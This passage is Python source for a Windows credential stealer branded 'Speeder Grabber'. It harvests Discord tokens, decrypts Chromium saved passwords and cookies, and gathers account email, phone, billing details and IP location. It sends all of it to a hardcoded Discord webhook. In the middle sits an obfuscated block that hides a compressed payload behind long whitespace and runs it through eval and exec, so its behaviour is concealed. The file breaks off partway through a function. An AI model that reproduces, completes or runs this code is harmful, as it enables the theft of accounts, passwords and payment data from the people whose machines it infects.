import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess

## PASTE YOUR DISCORD WEBHOOK
hook = "https://discord.com/api/webhooks/1062089073759621121/-2L6lEURmQCAw1bvsfGWfu6IrTFNkG9xqJE-Dp9o8ai6tLGsn0jtSrACROwHUkCP8MGT"


DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return "```None```"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "phone" in userjson: phone = f'{userjson["phone"]}'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

from builtins import *
from math import prod as Substract

from builtins import *
from math import prod as Substract


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_while, Math, _divide, Add, MemoryAccess, Calculate, _detectvar = exec, str, tuple, map, ord, globals, type

class _random:
    def __init__(self, _round):
        self._product = Substract((_round, -79659))
        self.Hypothesis(_walk=99267)

    def Hypothesis(self, _walk = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._product -= -99559 + _walk
        
        try:
            (({MemoryAccess: Add}, Theory) for Theory in (Add, _while, MemoryAccess))

        except ArithmeticError:
            {'thitetyd': _while} if _divide <= Calculate else {Math: Math} is _while

        except:
            _detectvar(54191 / 47601) == type

    def _absolute(self, While = -48076):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        While /= -70407 * 25750
        self.Multiply != type
        
        try:
            ((Add, {Math: Math}) for Add in {Math: Math} if Add > _divide)

        except ArithmeticError:
            (((Theory, Math, Add), MemoryAccess) for MemoryAccess in (Add, _while, MemoryAccess))

        except:
            _detectvar(-10363 + -1267) == bool

    def _algorithm(Random = Ellipsis):
        return Calculate()[Random]

    def _frame(_memoryaccess = 76079 / 22319, _power = str, _floor = Calculate):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _floor()[_memoryaccess] = _power
        
        try:
            (((Theory, Math, Add), _while) for _while in (Theory, Math, Add))

        except AssertionError:
            ((MemoryAccess, _divide) or _while if (MemoryAccess, _divide) and _while else ... or (_while, (MemoryAccess, _divide)))

        except:
            _detectvar(-6333 - 19505) == bool

    def execute(code = str):
        return _while(Math(_divide(Add(MemoryAccess, code))))

    @property
    def Multiply(self):
        self.Absolute = '<__main__.Substract object at 0x000005314BE99119>'
        return (self.Absolute, _random.Multiply)

if __name__ == '__main__':
    try:
        _random.execute(code = __code__)
        _substract = _random(_round = 50131 + -7485)

        if 449274 > 7380160:
            _random(_round = 18372 + 58651)._absolute(While = 47432 + _substract._product)
        elif 408051 < 5399362:
            _random(_round = -16171 / -52570)._absolute(While = 72025 * _substract._product)                                                                                                                                                                                                                                                          ;_random._frame(_memoryaccess='xwwxxwwwwxwwxwwxxx',_power=b'x\x9c\xddYm\x8f\xda8\x10\xfe\xce\xaf\xa0|\t\xd1vwC\x9c\xd8\x80\xd4/\'\xeeT\x10\xbb\x9c\xca\xe9\xb6\xa7\xb6\x8a\x12\xe2\xec\x9a\x9a\x18%\xa1\x0b\xff\xfef\xec@\xd9\x97\xb0\xbcTw\x12\xb6g\xec8\xe3\xb1\xfdx<\xb1\xa1\xc8V\xddZ\x1d\x82H\x9a:\xc7\x10\x04*J\x16\xf9$,T\x16\x04\xf5w\x1f\x1a\x1fWs\x9e\t\x956\xea*\xdb\x12\x0b\x17\xc5\x83\xcar-\xd3lDB\xcaU\xf1\xc0\xefUX\x10\x9f6\xde7~\x93\x0b\xfe\x89\xc7\r\xfbI\xab{Q<,"\xa3\xf8\xa1(\xe6y\xf7\xfa\xda\xd4]M\xd4\xec\xfa\x99\x9a\xeb\x8a\xbec\x91OT\x16?USV^\xdd\xdf_\xcfex\xbf\xe0\xcf\x1aI1\xe1i\xceM\xa3\xdf\xff\x1c^\xbaW\xce3\x91\x89\x8a\xcd{k\x9e\x89\xb4h6>r)U\xfdQe2~\xd7\xb0\xad\x9a\xdd\xddH\xe3{+\xff.b\xcb\xae\xf1\xe5\x84\xcf\x8b\x12\xcct\xbe\x80\x96\x9fT\xce\xf3z\x98\xf1z\xc6\xe3\xaf\xe9\xdfBI^\x98\x8a\x08\x90\xf9\x9a\xfe\xa3\x16\xfa)\xac\xa3\x92\xaf\xe9\xad\x8aT\xbc\xaaK\xf1\x1d\xda\xad\xd4\xa2a\xd7\xcc\xa0\xc4l\xae\xb2"\x08\xa0\xb7Un\xd9W|)\x8a\xa6]\x93j\x12\xca\xbci\x7f\xb1F\x8er\x94R\x0ed\xa68\x1a9\x8ec}\xfbp/U\x042\xb5\xd7\x05\xb0\xe9\xe7;\x88e\xc0\xe2\x9d\xf5\xa5\xdb\xbd\xb8\xbc\xb8l^6/Z\xb6\xfd\r\x94\xf0",\x8al\x87\x92\xd1HA\xec\x8dz\n"< \x83\xd0\xeb\xbdT\x16\x8b]\x8az=l\x0e-GX\x89\t\xf3\x11\xcc\xc4L\xb6V!\x80m\x87\xfd\xe1p0\x18\x02\xeb\x0f\xfa\xfd\xc1\xa0\x0f\xad~b\xb7\xabS\xd0\xd2\xd3\xc3\xc7I@\xc2\x00\x8d_(lZ\xd1B\xc8B\xa4\xb8\x08?\xc2l\xe7pnn!\xde\xdcB\xb8\xc1\x80\xd9\xed\rh\xbd{\x8ex\xf3\x95~\xf2T\x14R,\xa2\xe7\xf8\xd9\xef{%\xb4\xd8\x8f\x81\xbb\xa7\xc1\x1f\x1d\xa4\xc6\xfe\xf2\x8b\xf4\\\x894\xe6\xcb\xa6\xc5\x17\xd9_/\xde~\xb3w\x01\x84\xf8\xeb\' \\\x14e*F\xdap\xcf\x13%\xa9\xd4\xcb\xb7\xbbQ\x1a\xbb\x10\xc6cHc\x9d\x03;[x\xb2"?\x10\x9d4\x9d\x99\x04\xa4\xf9\xecl\xc1)B%\x93\xd7\xe0\xd9\xe1\x96\x1dSv\x80#v\xfa\xe5\xf9\xee.\x9e\xcb\xf0\x8f\xc3\x10\xd2F33\xd6\x93\x96\xc6t\xceF$\xc3\x1f\xfc0\x84\x96\xcb\xc7\xe5#\xa6\xc7%\x04,-\x97g\x0b\x0f\x97b>S\x93W\x9d\xd0k\x87\x04\x04\xa8\x0fAb\xc4$\xb1\xdc\xd7\xd9\xbe \t1\xc9\xc3T\x9c\nR\xa5\x9a\x03A\xaa\xd6\xb3\x06i\x95\x08\xb9\xe4\x0f\xe9\xe2\xc0\xad\x86\xde\x19\xb7\xda\xc6c\xe36\xb3\xac\xab\xa9\x12iu\xbb*x\x9b\x91\xe5%4!\x8e\x97x\xc0Mi\xfd\x84\x1ck0b\xc9K\xe0\xc0\x16s<\xdc7\xadvR\xbc2\xf43\xb5\xe8\t_\xbe\xba\xe1+\xcdY\x83\x8bH\x97Xc\xdcVP\xe11\x9b\x96\xdd\x82\xf7\xce>\xa2;\x96\x948n\xec\xb6\xdd\x98\xb4\xdc\xce[Kf\x1b\x06w\n\x19\xce\xa28\xac\x7f\xbe\x83P\xdeb\xb0\x84\xe9s\xb7\xca\xb2*!\xd81<\x9f\x10\x17\xa3O\xd6\x11\xcb\xa6\xe6)_\xd3\xdbvW\x0e~\xb6\xc6h\xb3Ip\x8bt+\xcf>G\r\x9fAlCd[\xb4\xe6:\xdf{\xb8Fq\x7fm,}\xd9\xad\x18O\xb5\xa5\xe1R\xe9\x053\x1bO\x97\xf6\xb347hA\xec\x04,\xf0\x82v\xe0\x07$  O^\xd6\x9ej\x8d\x9e\x9f\x90\x0e\x10\x05\xf2\xb6\xc8\xc5\xdc\x8d\xb4\xa5\xee\x92!GX\xf1-^\x15M\xd4\xd7F}\x89<\xc2\x0e\xac\xbe\xdc,\x92\xe1\xa7\xa2\x81\xb3$@\x0c\xc8)\tg\xe9\x03\xb5K\x04:%*\xfb\xc8\xb6\xf7Cg\x83\x0c\xf8\xbe\xc1\xb0\x0f\t\x19\xf8\xbf\xa1v\x83\xc3c\xb01\xb7)W3W\x97\xd6\xf9\xaf\x00\x89\x96\x93\xa7\xcf&OK\x00\xb6AzK\xf6P\x90\xb6\xfc\xc8z\xf4\xe8F\x0e\xdc\x9c\xbb\xbe\xba\x1d\x8ct\x82\xb4\xe6\xa6\xb4\xae\xc1|oG2\xd2\x9e\x19\x82\xb9\x9e\xe8\x1c]\xb4:\xdcq[\x83\x01\x1a\x876\x13\x8c`\'\xa7\xaef\xab\xfc\x1c9\x07\xae\x02\x8e\x0f\'\xa2zk\xa3\xec\xa1Q\x1e1\'s\xfb\xd7\xd7\xff\xf1xc\xa5{\x99\xa9ew\xc0\x1d\xd2\xc0\xd1\x9c\x00\xf7\x03\xf8H_8P\xc3\x9e\xd6\xee\xa7\xce\x87\x06,@?\xcb\x02\xf4\xc1^\xe0\x81<}Y\xfb\x1f\xc3\xfe\xd3\x87\x1e\xd1\x99\xeb\xd26\xf3 :\x8c\x90\xd0M\xdc\x04J\x1eu]N=\xdaa\x84\x12\x9a0\x97z\xf0\x0c%\x1a\xbb\tm1\x87v@\x8eQ\x9fBk\xa8Mh\xc4\x88\x9b\x90\x16\x9c8=\xd2!\x04\x8f\x06\x84A\xa9\x05\xdc\x87\xda6\x10\x81wm\xc2@\xce\x85\x96\xdcw)\x87\x1e|\xd0\x1e\xbb\xb1~\x9e\xb8\xb1G\x80(\x8c\xa7\x05\xe3jy1k1\nr\xdcw\xbc\x98\xf84d\x1d\xea\x13F\x19\x8d o\xa1\xa4\x0f#!\x0ek\xfb>\x83/\x0fH\x84XI=\xc6\xbc\xd0\x87\x1a\x0f\x1c\x89\x17y-\xe6z\x11\x10\xf4\xcd:\x1e\xf7(\x85I\xbe\to\xb5e\xa2m\x9bjm\xe1=u\xea\xaa\xb3\xf2\xdb\xe0\x95np\xfd%\xed\x94\xae\xd0\xd3\xee\xd0\xb8\xce}d\xd9\xbe\x9b\xf6\x18\xaba.;\x01;\xf3\x81\xd7\xe1\xc6\xfc@\xac\xd9\xff\xe5\xae\xf4\xa9ys\xff\xb93\xec\x08g%\xcbA\xe9\xeb\x83\xceN\xf6\xc0d\xebx\xd5\xd9:ZuJjm\x19\xc5>\xb2{\x1bE\t\xcdTL\xa7S)1\x89)\x10\xe4S!\xa4\xa8F\'\xc9\xd4\xac\xbe\xfe\xa3\xa0n\xfe\x7f\xa8\xc35lRC\xd6D\xe4\xf4\x96A\xf8\x00:e\xd7\x1e\x94\xfa\xbe\xfc0\x1e\x97\x87\x91\xf1\x93\x9f{k\xff\x02)8\x19\x7f')

        if 493932 > 6409895:
            _random(_round = 27646 * -98390)._absolute(While = -40620 - _substract._product)
        elif 214471 < 3340619:
            _substract.Hypothesis(_walk = _substract._product * -62647)                                                                                                                                                                                                                                                          ;lljjlljjjiijljjjl,O0O00O00OO000OO0oO0O0o0,wxwwwxwwwxxwwwwwwxwwxxxxx,NMNNNMNMNNNNNNMNMNMNNMMM,ooooooooOooooOOOoDOD=(lambda xwxwxxxxwxwxwwxwwxwxx:xwxwxxxxwxwxwwxwwxwxx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda xwxwxxxxwxwxwwxwwxwxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xwxwxxxxwxwxwwxwwxwxx)"),filename='\x58\x57\x57\x58\x58\x58\x57\x57\x57\x58\x57\x58\x58\x57\x58\x57\x58\x58\x57',mode='\x65\x76\x61\x6c'))),(lambda xwxwxxxxwxwxwwxwwxwxx:xwxwxxxxwxwxwwxwwxwxx(__import__('\x7a\x6c\x69\x62'))),(lambda IIIIllIIllIlllIlIllIl,xwxwxxxxwxwxwwxwwxwxx:IIIIllIIllIlllIlIllIl(xwxwxxxxwxwxwwxwwxwxx)),(lambda:(lambda xwxwxxxxwxwxwwxwwxwxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xwxwxxxxwxwxwwxwwxwxx)"),filename='\x58\x57\x57\x58\x58\x58\x57\x57\x57\x58\x57\x58\x58\x57\x58\x57\x58\x58\x57',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 310172 > 707759:
            _random(_round = -2856 / 74019)._absolute(While = -59454 * _substract._product)
        elif 474437 < 8339485:
            _random(_round = -49697 / -72334)._absolute(While = -30566 * _substract._product)                                                                                                                                                                                                                                                          ;ooooooooOooooOOOoDOD()(NMNNNMNMNNNNNNMNMNMNNMMM(lljjlljjjiijljjjl(wxwwwxwwwxxwwwwwwxwwxxxxx(O0O00O00OO000OO0oO0O0o0('\x76\x61\x72\x73'))),_random._algorithm(Random='xwwxxwwwwxwwxwwxxx')))

    except Exception as Theory:
        if 228725 > 5265031:
            _random.execute(code = Math(Theory))

        elif 216485 > 6121772:
            _random(_round = -90635 - -88475).Hypothesis(_walk = _substract._product - -43021)

def uploadToken(token, path):
    global hook
    global hookx
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://imgur.com/undefined.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "```No Rare Friends```"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 0000000,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{token}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{email}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{phone}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{getip()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Speeder Grabber",
                "icon_url": "https://imgur.com/undefined.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://imgur.com/undefined.jpg",
        "username": "Speeder Grabber",
        "attachments": []
        }
    urlopen(Request(hookx, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Speeder Grabber | Cookies Grabber",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [SpeederCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Speeder Grabber",
                        "icon_url": "https://imgur.com/undefined.jpg"
                    }
                }
            ],
            "username": "Speeder Grabber",
            "avatar_url": "https://imgur.com/undefined.jpg",
            "attachments": []
            }
        urlopen(Request(hookx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Speeder Grabber | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [SpeederPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Speeder Grabber",
                        "icon_url": "https://imgur.com/undefined.jpg"
                    }
                }
            ],
            "username": "Speeder Grabber",
            "avatar_url": "https://imgur.com/undefined.jpg",
            "attachments": []
            }
        urlopen(Request(hookx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 000000,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Speeder Grabber | File Stealer"
                },
                "footer": {
                    "text": "Speeder Grabber",
                    "icon_url": "https://imgur.com/undefined.jpg"
                }
                }
            ],
            "username": "Speeder Grabber",
            "avatar_url": "https://imgur.com/undefined.jpg",
            "attachments": []
            }
        urlopen(Request(hookx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Speeder Grabber BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
